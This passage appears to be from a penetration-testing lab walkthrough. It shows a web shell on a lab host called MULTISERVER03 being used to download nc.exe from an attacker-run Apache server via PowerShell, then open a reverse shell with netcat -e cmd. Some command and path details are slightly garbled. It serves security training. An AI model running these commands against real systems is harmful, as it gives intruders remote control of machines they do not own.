MULTISERVER03 is already "pre-compiled" in the lab. At this point, you can browse to /umbraco/forms.aspx on the HTTP server on port 80 on MULTISERVER03. You should see a webpage, which will let you run arbitrary commands on MULTISERVER03.

To download nc.exe onto MULTISERVER03, we first need to host it on a server that MULTISERVER03 can access. We can easily configure Apache2 on our Kali machine to do this. Apache is installed by default on Kali, so we just need to start the apache2 service.

```
kali@kali:~ sudo systemctl start apache2
[sudo] password for kali:
```

```
kali@kali:-
```

We can then find nc.exe from our Kali windows-resources/binaries directory and copy it to the Apache web root.

```
kali@kali:-$ find -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe
```

```
kali@kali:-$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```

Once the executable is set, we should be able to enable it on MULTISERVER03. We will use a PowerShell wget liner from our web shell to download nc.exe.

From the shell, we will use a command that will instruct PowerShell to download nc.exe from our Kali machine and write it to C:\Windows\Temp on MULTISERVER03 -OutputFile.

```
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

Once the PowerShell command is executed, our payload is downloaded from our Apache2 server to C:\Windows\nc.exe on MULTISERVER03.

We then set up a Netcat listener on port 4446 on our Kali machine.

```
kali@kali:$# nc -nvlp 4446
listening on [any] 4446
```

Once the listener is running, we'll execute nc.exe on MULTISERVER03 using the web shell again, -e to execute cmd exe once the connection is established.

```
C:\Windows\Temp\nc.exe - cmd exe 192.168.118.4 4446
```
